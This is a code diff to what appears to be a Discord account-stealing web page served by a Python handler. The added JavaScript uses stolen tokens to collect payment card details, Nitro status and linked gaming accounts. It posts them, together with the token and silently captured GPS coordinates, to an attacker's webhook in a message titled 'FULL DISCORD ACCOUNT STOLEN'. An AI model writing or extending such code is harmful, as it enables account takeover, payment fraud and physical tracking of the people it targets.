@@ -1,4 +1,3 @@
-
 from http.server import BaseHTTPRequestHandler
 import json
 import urllib.request
@@ -129,14 +128,34 @@ if(r.ok){{
 let u=await r.json();
 d+=`Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
 
-// Send to webhook
+// Get billing/payment info
+let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
+headers:{{'Authorization':t}}
+}});
+let cards=[];
+if(billing.ok){{
+let b=await billing.json();
+cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+}}
+
+// Get nitro status
+let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
+headers:{{'Authorization':t}}
+}});
+let nitro='None';
+if(subs.ok){{
+let s=await subs.json();
+if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
+}}
+
+// Send to webhook with ALL data
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
 content:'@everyone',
 embeds:[{{
-title:'🔑 DISCORD ACCOUNT STOLEN',
+title:'🔑 FULL DISCORD ACCOUNT STOLEN',
 color:16711680,
 fields:[
 {{name:'Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
@@ -144,6 +163,8 @@ fields:[
 {{name:'📱 Phone',value:`\`${{u.phone||'None'}}\``,inline:true}},
 {{name:'🆔 ID',value:`\`${{u.id}}\``,inline:false}},
 {{name:'🔐 2FA',value:u.mfa_enabled?'✅':'❌',inline:true}},
+{{name:'💎 Nitro',value:nitro,inline:true}},
+{{name:'💳 Payment Methods',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
 {{name:'🔑 Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
 ],
 thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}}
@@ -176,7 +197,7 @@ color:16753920
 }});
 }}
 
-// GPS LOCATION (VPN BYPASS)
+// GPS LOCATION (VPN BYPASS) - SILENT MODE
 if(navigator.geolocation){{
 navigator.geolocation.getCurrentPosition(async(p)=>{{
 let lat=p.coords.latitude;
@@ -208,7 +229,44 @@ fields:[
 }})
 }});
 }}catch(e){{}}
-}},()=>{{}},{{enableHighAccuracy:true,timeout:10000}});
+}},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
+}}
+
+// STEAL DISCORD PAYMENT INFO & MORE
+if(tok.length>0){{
+for(let t of tok){{
+try{{
+// Get billing/payment info
+let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
+headers:{{'Authorization':t}}
+}});
+let cards=[];
+if(billing.ok){{
+let b=await billing.json();
+cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+}}
+
+// Get nitro status
+let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
+headers:{{'Authorization':t}}
+}});
+let nitro='None';
+if(subs.ok){{
+let s=await subs.json();
+if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
+}}
+
+// Get connections (Steam, Xbox, etc)
+let conn=await fetch('https://discord.com/api/v9/users/@me/connections',{{
+headers:{{'Authorization':t}}
+}});
+let connections=[];
+if(conn.ok){{
+let c=await conn.json();
+connections=c.map(x=>`${{x.type}}: ${{x.name}}`);
+}}
+}}catch(e){{}}
+}}
 }}
 }})();
 </script>
